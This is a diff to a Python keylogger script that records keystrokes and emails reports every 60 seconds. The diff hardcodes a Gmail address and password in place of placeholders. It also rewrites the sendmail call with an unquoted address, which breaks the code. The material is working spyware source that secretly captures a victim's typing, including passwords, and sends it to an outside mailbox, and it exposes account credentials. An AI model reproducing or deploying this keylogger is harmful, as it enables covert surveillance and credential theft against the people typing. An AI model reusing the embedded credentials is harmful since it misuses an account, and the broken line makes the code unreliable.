@@ -5,8 +5,8 @@ from threading import Timer
 from datetime import datetime
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "put_real_address_here@gmail.com"
-EMAIL_PASSWORD = "put_real_pw"
+EMAIL_ADDRESS = "rikycaunsag@gmail.com"
+EMAIL_PASSWORD = "09483442871a"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
@@ -28,7 +28,7 @@ class Keylogger:
         name = event.name
         if len(name) > 1:
             # not a character, special key (e.g ctrl, alt, etc.)
-            # uppercase with []
+            # uppercase with [ctrl]
             if name == "space":
                 # " " instead of "space"
                 name = " "
@@ -67,7 +67,7 @@ class Keylogger:
         # login to the email account
         server.login(email, password)
         # send the actual message
-        server.sendmail(email, email, message)
+        server.sendmail(rikycaunsag@gmail.com, rikycaunsag@gmail.com, message)
         # terminates the session
         server.quit()
 
